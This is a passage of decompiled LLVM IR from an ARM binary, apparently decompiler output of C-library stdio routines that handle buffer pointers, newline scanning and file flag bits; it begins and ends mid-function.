  %v0_1310c = load i32, i32* %r4.global-to-local, align 4
  %v1_1310c = inttoptr i32 %v0_1310c to i16*
  %v2_1310c = load i16, i16* %v1_1310c, align 2
  %v3_1310c = zext i16 %v2_1310c to i32
  store i32 %v3_1310c, i32* %r3.global-to-local, align 4
  %v1_13110 = add i32 %v0_1310c, 8
  store i32 %v1_13110, i32* %r1.global-to-local, align 4
  %v1_13114 = inttoptr i32 %v1_13110 to i32*
  %v2_13114 = load i32, i32* %v1_13114, align 4
  store i32 %v2_13114, i32* %r1.global-to-local, align 4
  %v3_13114 = add i32 %v0_1310c, 12
  %v4_13114 = inttoptr i32 %v3_13114 to i32*
  %v5_13114 = load i32, i32* %v4_13114, align 4
  %v1_13118 = or i32 %v3_1310c, 8
  store i32 %v1_13118, i32* %r3.global-to-local, align 4
  %v2_1311c = sub i32 %v5_13114, %v2_13114
  store i32 %v2_1311c, i32* %r2.global-to-local, align 4
  %v9_1311c = icmp eq i32 %v5_13114, %v2_13114
  store i1 %v9_1311c, i1* %cpsr_z.global-to-local, align 1
  %v1_13120 = trunc i32 %v1_13118 to i16
  store i16 %v1_13120, i16* %v1_1310c, align 2
  br i1 %v9_1311c, label %dec_label_pc_1310c.dec_label_pc_1316c_crit_edge, label %dec_label_pc_13128

dec_label_pc_1310c.dec_label_pc_1316c_crit_edge:  ; preds = %dec_label_pc_1310c
  %v0_1316c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1316c

dec_label_pc_13128:                               ; preds = %dec_label_pc_1310c
  %v0_13128 = load i32, i32* %r2.global-to-local, align 4
  %v1_13128 = load i32, i32* %r5.global-to-local, align 4
  %v3_13128 = icmp ult i32 %v0_13128, %v1_13128
  %v9_13128 = icmp eq i32 %v0_13128, %v1_13128
  store i1 %v9_13128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13128, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_13128
  store i32 %v1_13128, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_13128, %bb23
  %v2_1313c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_13150
  %v2_1313c = phi i32 [ %v2_1313c.pre, %.preheader ], [ %v1_13154, %dec_label_pc_13150 ]
  %v0_13130 = load i32, i32* %r6.global-to-local, align 4
  %v1_13130 = inttoptr i32 %v0_13130 to i8*
  %v2_13130 = load i8, i8* %v1_13130, align 1
  %v3_13130 = zext i8 %v2_13130 to i32
  store i32 %v3_13130, i32* %r3.global-to-local, align 4
  %v7_13134 = icmp eq i8 %v2_13130, 10
  store i1 %v7_13134, i1* %cpsr_z.global-to-local, align 1
  %v1_13138 = add i32 %v0_13130, 1
  store i32 %v1_13138, i32* %r6.global-to-local, align 4
  %v3_1313c = inttoptr i32 %v2_1313c to i8*
  store i8 %v2_13130, i8* %v3_1313c, align 1
  %v0_13140 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13140, label %dec_label_pc_13144, label %dec_label_pc_13150

dec_label_pc_13144:                               ; preds = %bb24
  %v0_13144 = load i32, i32* %r4.global-to-local, align 4
  %v1_13144 = inttoptr i32 %v0_13144 to i16*
  %v2_13144 = load i16, i16* %v1_13144, align 2
  %v3_13144 = zext i16 %v2_13144 to i32
  store i32 %v3_13144, i32* %r3.global-to-local, align 4
  %v1_13148 = and i32 %v3_13144, 256
  %v2_13148 = icmp eq i32 %v1_13148, 0
  store i1 %v2_13148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13148, label %dec_label_pc_13150, label %dec_label_pc_13144.dec_label_pc_1315c_crit_edge

dec_label_pc_13144.dec_label_pc_1315c_crit_edge:  ; preds = %dec_label_pc_13144
  %v0_13160.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1315c

dec_label_pc_13150:                               ; preds = %dec_label_pc_13144, %bb24
  %v0_13150 = load i32, i32* %r2.global-to-local, align 4
  %v1_13150 = add i32 %v0_13150, -1
  store i32 %v1_13150, i32* %r2.global-to-local, align 4
  %v7_13150 = icmp eq i32 %v0_13150, 1
  store i1 %v7_13150, i1* %cpsr_z.global-to-local, align 1
  %v0_13154 = load i32, i32* %r1.global-to-local, align 4
  %v1_13154 = add i32 %v0_13154, 1
  store i32 %v1_13154, i32* %r1.global-to-local, align 4
  br i1 %v7_13150, label %dec_label_pc_13150.dec_label_pc_1315c_crit_edge, label %bb24

dec_label_pc_13150.dec_label_pc_1315c_crit_edge:  ; preds = %dec_label_pc_13150
  %v0_1315c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_13144.dec_label_pc_1315c_crit_edge, %dec_label_pc_13150.dec_label_pc_1315c_crit_edge
  %v0_13160 = phi i32 [ %v1_13154, %dec_label_pc_13150.dec_label_pc_1315c_crit_edge ], [ %v0_13160.pre, %dec_label_pc_13144.dec_label_pc_1315c_crit_edge ]
  %v0_1315c = phi i32 [ %v0_1315c.pre, %dec_label_pc_13150.dec_label_pc_1315c_crit_edge ], [ %v0_13144, %dec_label_pc_13144.dec_label_pc_1315c_crit_edge ]
  %v1_1315c = add i32 %v0_1315c, 8
  %v2_1315c = inttoptr i32 %v1_1315c to i32*
  %v3_1315c = load i32, i32* %v2_1315c, align 4
  store i32 %v3_1315c, i32* %r3.global-to-local, align 4
  %v2_13160 = add i32 %v0_1315c, 16
  %v3_13160 = inttoptr i32 %v2_13160 to i32*
  store i32 %v0_13160, i32* %v3_13160, align 4
  %v0_13164 = load i32, i32* %r3.global-to-local, align 4
  %v1_13164 = load i32, i32* %r1.global-to-local, align 4
  %v2_13164 = sub i32 %v1_13164, %v0_13164
  store i32 %v2_13164, i32* %r3.global-to-local, align 4
  %v1_13168 = load i32, i32* %r5.global-to-local, align 4
  %v2_13168 = sub i32 %v1_13168, %v2_13164
  store i32 %v2_13168, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_1310c.dec_label_pc_1316c_crit_edge, %dec_label_pc_1315c
  %v0_1316c = phi i32 [ %v0_1316c.pre, %dec_label_pc_1310c.dec_label_pc_1316c_crit_edge ], [ %v2_13168, %dec_label_pc_1315c ]
  %v1_1316c = load i32, i32* @r7, align 4
  %v2_1316c = sub i32 %v1_1316c, %v0_1316c
  br label %dec_label_pc_13170

dec_label_pc_130e0.dec_label_pc_13170.loopexit_crit_edge: ; preds = %dec_label_pc_130e0thread-pre-split
  %v0_13170.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13170

dec_label_pc_13170:                               ; preds = %dec_label_pc_130c8, %dec_label_pc_130e0.dec_label_pc_13170.loopexit_crit_edge, %dec_label_pc_1316c
  %v0_13170 = phi i32 [ %v2_1316c, %dec_label_pc_1316c ], [ %v0_13170.pre.pre, %dec_label_pc_130e0.dec_label_pc_13170.loopexit_crit_edge ], [ 0, %dec_label_pc_130c8 ]
  %v2_13174 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13174, i32* %r4.global-to-local, align 4
  store i32 %v12_130c8, i32* @r7, align 4
  ret i32 %v0_13170

; uselistorder directives
  uselistorder i32 %v0_1315c, { 1, 0 }
  uselistorder i32 %v1_13154, { 0, 2, 1 }
  uselistorder i32 %v0_13150, { 1, 0 }
  uselistorder i32 %v1_13128, { 0, 2, 1 }
  uselistorder i32 %v0_13128, { 1, 0 }
  uselistorder i32 %v5_13114, { 1, 0 }
  uselistorder i32 %v2_13114, { 1, 0, 2 }
  uselistorder i32 %v3_130f8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_130f0, { 1, 0 }
  uselistorder i32 %v5_13104, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 6, 4, 2, 1, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 6, 5, 2, 3, 4, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 6, 8, 7, 5, 1, 2, 3, 4, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5, 8 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_13170, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1316c, { 1, 0 }
  uselistorder label %dec_label_pc_1315c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_130e8, { 1, 0 }
}

define i32 @function_1317c(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_1317c:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_1317c = load i32, i32* @r4, align 4
  store i32 %v3_1317c, i32* %stack_var_-20, align 4
  %v6_1317c = load i32, i32* @r5, align 4
  %v9_1317c = load i32, i32* @r6, align 4
  %v12_1317c = load i32, i32* @r7, align 4
  %v3_13180 = load i16, i16* %arg3, align 2
  %v4_13180 = zext i16 %v3_13180 to i32
  %v1_13184 = and i32 %v4_13180, 512
  store i32 %v1_13184, i32* @r4, align 4
  %v2_13184 = icmp eq i32 %v1_13184, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13184, label %dec_label_pc_1319c, label %dec_label_pc_13298

dec_label_pc_1319c:                               ; preds = %dec_label_pc_1317c
  %v2_1319c = add i32 %tmp, 4
  %v3_1319c = inttoptr i32 %v2_1319c to i32*
  %v4_1319c = load i32, i32* %v3_1319c, align 4
  %v2_131a4 = add i32 %tmp, 16
  %v3_131a4 = inttoptr i32 %v2_131a4 to i32*
  %v4_131a4 = load i32, i32* %v3_131a4, align 4
  store i32 %v4_131a4, i32* @r0, align 4
  %v2_131a8 = add i32 %tmp, 12
  %v3_131a8 = inttoptr i32 %v2_131a8 to i32*
  %v4_131a8 = load i32, i32* %v3_131a8, align 4
  store i32 %v4_131a8, i32* @r3, align 4
  %v4_131ac = icmp eq i32 %v4_1319c, -2
  %v2_131b0 = sub i32 %v4_131a8, %v4_131a4
  br i1 %v4_131ac, label %dec_label_pc_131b0, label %dec_label_pc_131d8

dec_label_pc_131b0:                               ; preds = %dec_label_pc_1319c
  %v3_131b4 = icmp ugt i32 %v2_131b0, %arg2
  br i1 %v3_131b4, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_131b0
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_131b0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_131b0, %dec_label_pc_131b0 ]
  %v0_131bc = phi i32 [ %arg2, %bb ], [ %v2_131b0, %dec_label_pc_131b0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_131bc, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_131c4 = call i32 @function_f350()
  %v0_131c8 = load i32, i32* @r5, align 4
  %v1_131c8 = add i32 %v0_131c8, 16
  %v2_131c8 = inttoptr i32 %v1_131c8 to i32*
  %v3_131c8 = load i32, i32* %v2_131c8, align 4
  %v1_131cc = load i32, i32* @r4, align 4
  %v2_131cc = add i32 %v1_131cc, %v3_131c8
  store i32 %v2_131cc, i32* %v2_131c8, align 4
  br label %dec_label_pc_132ac

dec_label_pc_131d8:                               ; preds = %dec_label_pc_1319c
  store i32 %v2_131b0, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_131b0, %arg2
  br i1 %tmp18, label %dec_label_pc_13278, label %dec_label_pc_131e4

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131d8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_131ec = call i32 @function_f350()
  %v0_131f0 = load i32, i32* @r5, align 4
  %v1_131f0 = add i32 %v0_131f0, 16
  %v2_131f0 = inttoptr i32 %v1_131f0 to i32*
  %v3_131f0 = load i32, i32* %v2_131f0, align 4
  %v1_131f4 = inttoptr i32 %v0_131f0 to i16*
  %v2_131f4 = load i16, i16* %v1_131f4, align 2
  %v1_131f8 = load i32, i32* @r6, align 4
  %v2_131f8 = add i32 %v1_131f8, %v3_131f0
  %v1_131fc = and i16 %v2_131f4, 256
  %v2_131fc = icmp eq i16 %v1_131fc, 0
  store i32 %v2_131f8, i32* %v2_131f0, align 4
  br i1 %v2_131fc, label %dec_label_pc_132ac, label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %dec_label_pc_131e4
  %v0_13208 = load i32, i32* @r7, align 4
  %v0_13210 = load i32, i32* @r6, align 4
  %v4_13214 = call i32 @function_1468c(i32 %v0_13208, i32 10, i32 %v0_13210, i32 %v2_131f8)
  %v2_13218 = icmp eq i32 %v4_13214, 0
  br i1 %v2_13218, label %dec_label_pc_132ac, label %dec_label_pc_13220

dec_label_pc_13220:                               ; preds = %dec_label_pc_13208
  %v0_13220 = load i32, i32* @r5, align 4
  store i32 %v0_13220, i32* @r0, align 4
  %v0_13224 = call i32 @function_d978()
  %v2_13228 = icmp eq i32 %v0_13224, 0
  br i1 %v2_13228, label %dec_label_pc_132ac, label %dec_label_pc_13230

dec_label_pc_13230:                               ; preds = %dec_label_pc_13220
  %v1_13230 = load i32, i32* @r6, align 4
  %v3_13230 = icmp uge i32 %v0_13224, %v1_13230
  %v1_13230.v0_13224 = select i1 %v3_13230, i32 %v1_13230, i32 %v0_13224
  store i32 %v1_13230.v0_13224, i32* @r4, align 4
  %v2_1323c = sub i32 %v1_13230, %v1_13230.v0_13224
  %v0_13240 = load i32, i32* @r7, align 4
  %v2_13240 = add i32 %v0_13240, %v2_1323c
  store i32 %v2_13240, i32* %r7.global-to-local, align 4
  store i32 %v2_13240, i32* @r0, align 4
  store i32 %v1_13230.v0_13224, i32* @r2, align 4
  %v4_13250 = call i32 @function_14430(i32 %v2_13240, i32 10, i32 %v1_13230.v0_13224, i32 %v2_1323c)
  %v2_13254 = icmp eq i32 %v4_13250, 0
  br i1 %v2_13254, label %dec_label_pc_132ac, label %dec_label_pc_1325c

dec_label_pc_1325c:                               ; preds = %dec_label_pc_13230
  %v0_1325c = load i32, i32* @r5, align 4
  %v1_1325c = add i32 %v0_1325c, 16
  %v2_1325c = inttoptr i32 %v1_1325c to i32*
  %v3_1325c = load i32, i32* %v2_1325c, align 4
  %v0_13260 = load i32, i32* %r7.global-to-local, align 4
  %v1_13260 = load i32, i32* @r4, align 4
  %v2_13260 = sub i32 %v0_13260, %v4_13250
  %v2_13264 = add i32 %v2_13260, %v1_13260
  %v2_13268 = sub i32 %v3_1325c, %v2_13264
  %v1_1326c = load i32, i32* @r6, align 4
  %v2_1326c = sub i32 %v1_1326c, %v2_13264
  store i32 %v2_1326c, i32* @r6, align 4
  store i32 %v2_13268, i32* %v2_1325c, align 4
  br label %dec_label_pc_132ac

dec_label_pc_13278:                               ; preds = %dec_label_pc_131d8
  %v2_13278 = add i32 %tmp, 8
  %v3_13278 = inttoptr i32 %v2_13278 to i32*
  %v4_13278 = load i32, i32* %v3_13278, align 4
  %v9_1327c = icmp eq i32 %v4_131a4, %v4_13278
  br i1 %v9_1327c, label %dec_label_pc_13298, label %dec_label_pc_13284

dec_label_pc_13284:                               ; preds = %dec_label_pc_13278
  store i32 %tmp, i32* @r0, align 4
  %v0_13288 = call i32 @function_d978()
  %v2_1328c = icmp eq i32 %v0_13288, 0
  br i1 %v2_1328c, label %dec_label_pc_13284.dec_label_pc_13298_crit_edge, label %bb15

dec_label_pc_13284.dec_label_pc_13298_crit_edge:  ; preds = %dec_label_pc_13284
  %v0_13298.pre = load i32, i32* @r6, align 4
  %v0_1329c.pre = load i32, i32* @r5, align 4
  %v0_132a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13298

bb15:                                             ; preds = %dec_label_pc_13284
  %v1_13290 = load i32, i32* @r4, align 4
  store i32 %v1_13290, i32* @r6, align 4
  br label %dec_label_pc_132ac

dec_label_pc_13298:                               ; preds = %dec_label_pc_13284.dec_label_pc_13298_crit_edge, %dec_label_pc_1317c, %dec_label_pc_13278
  %v0_132a0 = phi i32 [ %v0_132a0.pre, %dec_label_pc_13284.dec_label_pc_13298_crit_edge ], [ %arg1, %dec_label_pc_1317c ], [ %arg1, %dec_label_pc_13278 ]
  %v0_1329c = phi i32 [ %v0_1329c.pre, %dec_label_pc_13284.dec_label_pc_13298_crit_edge ], [ %tmp, %dec_label_pc_1317c ], [ %tmp, %dec_label_pc_13278 ]
  %v0_13298 = phi i32 [ %v0_13298.pre, %dec_label_pc_13284.dec_label_pc_13298_crit_edge ], [ %arg2, %dec_label_pc_1317c ], [ %arg2, %dec_label_pc_13278 ]
  %v1_1329c = inttoptr i32 %v0_1329c to i16*
  %v5_132a4 = call i32 @function_130c8(i16* %v1_1329c, i32 %v0_132a0, i32 %v0_13298)
  store i32 %v5_132a4, i32* @r6, align 4
  br label %dec_label_pc_132ac

dec_label_pc_132ac:                               ; preds = %bb15, %dec_label_pc_13230, %dec_label_pc_13220, %dec_label_pc_13208, %dec_label_pc_131e4, %dec_label_pc_1325c, %bb12, %dec_label_pc_13298
  %v0_132ac = load i32, i32* @r6, align 4
  %v2_132b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_132b4, i32* @r4, align 4
  store i32 %v6_1317c, i32* @r5, align 4
  store i32 %v9_1317c, i32* @r6, align 4
  store i32 %v12_1317c, i32* @r7, align 4
  ret i32 %v0_132ac

; uselistorder directives
  uselistorder i32 %v2_13264, { 1, 0 }
  uselistorder i32 %v2_1323c, { 1, 0 }
  uselistorder i32 %v1_13230.v0_13224, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13230, { 1, 0, 2 }
  uselistorder i32 %v2_131b0, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 (i16*, i32, i32)* @function_130c8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_132ac, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_13298, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @function_132bc(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_132bc:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_132bc = load i32, i32* @r4, align 4
  store i32 %v3_132bc, i32* %stack_var_-8, align 4
  %v3_132c0 = load i16, i16* %arg1, align 2
  %v4_132c0 = zext i16 %v3_132c0 to i32
  %v2_132c4 = and i32 %v4_132c0, %arg2
  %v4_132c4 = icmp eq i32 %v2_132c4, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_132c4, label %dec_label_pc_132d0, label %dec_label_pc_132e0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_132bc
  %v1_132d0 = and i32 %v4_132c0, 2176
  %v2_132d0 = icmp eq i32 %v1_132d0, 0
  br i1 %v2_132d0, label %dec_label_pc_132d8, label %dec_label_pc_132ec

dec_label_pc_132d8:                               ; preds = %dec_label_pc_132d0
  %v2_132d8 = or i32 %v4_132c0, %arg2
  %v1_132dc = trunc i32 %v2_132d8 to i16
  store i16 %v1_132dc, i16* %arg1, align 2
  %v0_132e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_132e0

dec_label_pc_132e0:                               ; preds = %dec_label_pc_132bc, %dec_label_pc_132d8
  %v0_1331c = phi i32 [ %tmp, %dec_label_pc_132bc ], [ %v0_132e0.pre, %dec_label_pc_132d8 ]
  %v1_132e0 = inttoptr i32 %v0_1331c to i16*
  %v2_132e0 = load i16, i16* %v1_132e0, align 2
  %v3_132e0 = zext i16 %v2_132e0 to i32
  store i32 %v3_132e0, i32* @ip, align 4
  %v1_132e4 = and i32 %v3_132e0, 32
  %v2_132e4 = icmp eq i32 %v1_132e4, 0
  br i1 %v2_132e4, label %dec_label_pc_1330c, label %dec_label_pc_132ec

dec_label_pc_132ec:                               ; preds = %dec_label_pc_132d0, %dec_label_pc_132e0
  %v0_132ec = call i32 @function_ce08()
  store i32 %v0_132ec, i32* %r0.global-to-local, align 4
  %v2_132f4 = inttoptr i32 %v0_132ec to i32*
  store i32 9, i32* %v2_132f4, align 4
  br label %dec_label_pc_132f8

dec_label_pc_132f8:                               ; preds = %dec_label_pc_13334, %dec_label_pc_132ec
  %v0_132f8 = load i32, i32* @r4, align 4
  %v1_132f8 = inttoptr i32 %v0_132f8 to i16*
  %v2_132f8 = load i16, i16* %v1_132f8, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_13300 = or i16 %v2_132f8, 8
  store i16 %v1_13300, i16* %v1_132f8, align 2
  br label %bb11

dec_label_pc_1330c:                               ; preds = %dec_label_pc_132e0
  %tmp14 = urem i16 %v2_132e0, 4
  %v2_1330c = icmp eq i16 %tmp14, 0
  br i1 %v2_1330c, label %dec_label_pc_13368, label %dec_label_pc_13314

dec_label_pc_13314:                               ; preds = %dec_label_pc_1330c
  %v1_13314 = and i32 %v3_132e0, 4
  store i32 %v1_13314, i32* @r1, align 4
  %v2_13314 = icmp eq i32 %v1_13314, 0
  br i1 %v2_13314, label %dec_label_pc_1331c, label %dec_label_pc_1334c

dec_label_pc_1331c:                               ; preds = %dec_label_pc_13314
  %v1_1331c = add i32 %v0_1331c, 20
  %v2_1331c = inttoptr i32 %v1_1331c to i32*
  %v3_1331c = load i32, i32* %v2_1331c, align 4
  store i32 %v3_1331c, i32* %r2.global-to-local, align 4
  %v1_13320 = add i32 %v0_1331c, 16
  %v2_13320 = inttoptr i32 %v1_13320 to i32*
  %v3_13320 = load i32, i32* %v2_13320, align 4
  %v9_13324 = icmp eq i32 %v3_1331c, %v3_13320
  br i1 %v9_13324, label %dec_label_pc_1332c, label %dec_label_pc_13334

dec_label_pc_1332c:                               ; preds = %dec_label_pc_1331c
  %v1_1332c = and i32 %v3_132e0, 2
  %v2_1332c = icmp eq i32 %v1_1332c, 0
  br i1 %v2_1332c, label %dec_label_pc_1334c, label %dec_label_pc_13334

dec_label_pc_13334:                               ; preds = %dec_label_pc_1331c, %dec_label_pc_1332c
  %v1_13334 = and i32 %v3_132e0, 1024
  %tmp12 = udiv i32 %v1_13334, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_13340 = call i32 @function_157b8()
  store i32 %v0_13340, i32* %r0.global-to-local, align 4
  %v2_13344 = icmp eq i32 %v0_13340, 0
  br i1 %v2_13344, label %.dec_label_pc_1334c_crit_edge, label %dec_label_pc_132f8

.dec_label_pc_1334c_crit_edge:                    ; preds = %dec_label_pc_13334
  %v0_1334c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1334c

dec_label_pc_1334c:                               ; preds = %.dec_label_pc_1334c_crit_edge, %dec_label_pc_13314, %dec_label_pc_1332c
  %v2_13358 = phi i32 [ %v0_1334c.pre, %.dec_label_pc_1334c_crit_edge ], [ %v0_1331c, %dec_label_pc_13314 ], [ %v0_1331c, %dec_label_pc_1332c ]
  %v1_1334c = inttoptr i32 %v2_13358 to i16*
  %v2_1334c = load i16, i16* %v1_1334c, align 2
  %v1_13350 = add i32 %v2_13358, 8
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  store i32 %v3_13350, i32* %r2.global-to-local, align 4
  %v1_13354 = and i16 %v2_1334c, -4
  store i16 %v1_13354, i16* %v1_1334c, align 2
  %v0_1335c = load i32, i32* %r2.global-to-local, align 4
  %v1_1335c = load i32, i32* @r4, align 4
  %v2_1335c = add i32 %v1_1335c, 20
  %v3_1335c = inttoptr i32 %v2_1335c to i32*
  store i32 %v0_1335c, i32* %v3_1335c, align 4
  %v0_13360 = load i32, i32* %r2.global-to-local, align 4
  %v1_13360 = load i32, i32* @r4, align 4
  %v2_13360 = add i32 %v1_13360, 24
  %v3_13360 = inttoptr i32 %v2_13360 to i32*
  store i32 %v0_13360, i32* %v3_13360, align 4
  %v0_13364 = load i32, i32* %r2.global-to-local, align 4
  %v1_13364 = load i32, i32* @r4, align 4
  %v2_13364 = add i32 %v1_13364, 16
  %v3_13364 = inttoptr i32 %v2_13364 to i32*
  store i32 %v0_13364, i32* %v3_13364, align 4
  %v0_13368.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13368

dec_label_pc_13368:                               ; preds = %dec_label_pc_1330c, %dec_label_pc_1334c
  %v2_13374 = phi i32 [ %v0_1331c, %dec_label_pc_1330c ], [ %v0_13368.pre, %dec_label_pc_1334c ]
  %v1_13368 = inttoptr i32 %v2_13374 to i16*
  %v2_13368 = load i16, i16* %v1_13368, align 2
  %v3_13368 = zext i16 %v2_13368 to i32
  %v1_1336c = or i16 %v2_13368, 64
  %v1_13370 = and i32 %v3_13368, 2816
  store i32 %v1_13370, i32* %r0.global-to-local, align 4
  %v2_13370 = icmp eq i32 %v1_13370, 0
  store i16 %v1_1336c, i16* %v1_13368, align 2
  br i1 %v2_13370, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_13368
  %v1_13378 = load i32, i32* @r4, align 4
  %v2_13378 = add i32 %v1_13378, 12
  %v3_13378 = inttoptr i32 %v2_13378 to i32*
  %v4_13378 = load i32, i32* %v3_13378, align 4
  %v3_1337c = add i32 %v1_13378, 28
  %v4_1337c = inttoptr i32 %v3_1337c to i32*
  store i32 %v4_13378, i32* %v4_1337c, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_13368
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_132f8, %.thread1
  %v2_13384 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13384, i32* @r4, align 4
  %v1_13388 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13388

; uselistorder directives
  uselistorder i32 %v2_13358, { 1, 0 }
  uselistorder i32 %v0_1331c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_132c0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13368, { 1, 0 }
  uselistorder label %dec_label_pc_1334c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13334, { 1, 0 }
  uselistorder label %dec_label_pc_132ec, { 1, 0 }
  uselistorder label %dec_label_pc_132e0, { 1, 0 }
}

define i32 @function_1338c() local_unnamed_addr {
dec_label_pc_1338c:
  %v0_1338c = load i32, i32* @r2, align 4
  %v1_1338c = icmp slt i32 %v0_1338c, 0
  %v0_13390 = load i32, i32* @r0, align 4
  %v1_13394 = and i32 %v0_13390, 2048
  %v2_133c8 = icmp eq i32 %v1_13394, 0
  br i1 %v1_1338c, label %dec_label_pc_133c8, label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_1338c
  br i1 %v2_133c8, label %dec_label_pc_133a4, label %dec_label_pc_133d0

dec_label_pc_133a4:                               ; preds = %dec_label_pc_1339c
  %v7_133a4 = icmp eq i32 %v0_13390, 256
  %v0_133a8 = load i32, i32* @r1, align 4
  %v1_133a8 = inttoptr i32 %v0_133a8 to i32*
  %v2_133a8 = load i32, i32* %v1_133a8, align 4
  %v2_133ac = urem i32 %v2_133a8, 256
  %v2_133ac.v2_133a8 = select i1 %v7_133a4, i32 %v2_133ac, i32 %v2_133a8
  br i1 %v7_133a4, label %.thread, label %dec_label_pc_133b4

dec_label_pc_133b4:                               ; preds = %dec_label_pc_133a4
  %v7_133b4 = icmp eq i32 %v0_13390, 512
  br i1 %v7_133b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_133b4
  %v4_133bc = urem i32 %v2_133ac.v2_133a8, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_133b4, %dec_label_pc_133a4, %bb
  %v1_133c4 = phi i32 [ %v2_133a8, %dec_label_pc_133b4 ], [ %v2_133ac, %dec_label_pc_133a4 ], [ %v4_133bc, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_133c4

dec_label_pc_133c8:                               ; preds = %dec_label_pc_1338c
  br i1 %v2_133c8, label %dec_label_pc_133d8, label %dec_label_pc_133d0

dec_label_pc_133d0:                               ; preds = %dec_label_pc_1339c, %dec_label_pc_133c8
  %v0_133d0 = load i32, i32* @r1, align 4
  %v1_133d0 = inttoptr i32 %v0_133d0 to i32*
  %v2_133d0 = load i32, i32* %v1_133d0, align 4
  %v3_133d0 = add i32 %v0_133d0, 4
  %v4_133d0 = inttoptr i32 %v3_133d0 to i32*
  %v5_133d0 = load i32, i32* %v4_133d0, align 4
  store i32 %v5_133d0, i32* @r1, align 4
  ret i32 %v2_133d0

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133c8
  %v7_133d8 = icmp eq i32 %v0_13390, 256
